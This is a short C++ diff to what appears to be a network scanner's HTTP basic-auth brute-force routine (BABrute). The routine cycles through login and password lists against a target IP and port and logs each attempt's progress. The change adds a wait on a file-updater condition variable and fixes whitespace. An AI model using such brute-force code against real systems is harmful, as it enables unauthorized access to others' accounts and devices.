@@ -1,4 +1,5 @@
 #include "BasicAuth.h"
+#include "FileUpdater.h"
 
 bool BA::checkOutput(const string *buffer, const char *ip, const int port) {
     if((Utils::ci_find_substr(*buffer, "200 ok") != -1 ||
@@ -36,12 +37,13 @@ lopaStr BA::BABrute(const char *ip, const int port) {
     ZeroMemory(lps.login, sizeof(lps.login));
     ZeroMemory(lps.pass, sizeof(lps.pass));
     ZeroMemory(lps.other, sizeof(lps.other));
-	int passCounter = 0;
+    int passCounter = 0;
 
     strcpy(lps.login, "UNKNOWN");
 
     for(int i = 0; i < MaxLogin; ++i) {
         for (int j = 0; j < MaxPass; ++j) {
+            FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready;});
             if (!globalScanFlag) return lps;
 
             lpString = string(loginLst[i]) + ":" + string(passLst[j]);
@@ -55,7 +57,7 @@ lopaStr BA::BABrute(const char *ip, const int port) {
             };
 
 			if (BALogSwitched) stt->doEmitionBAData("BA: " + QString(ip) + ":" + QString::number(port) + 
-				"; l/p: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" + 
+                "; l/p: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" +
 				QString::number((++passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");
 
             Sleep(100);
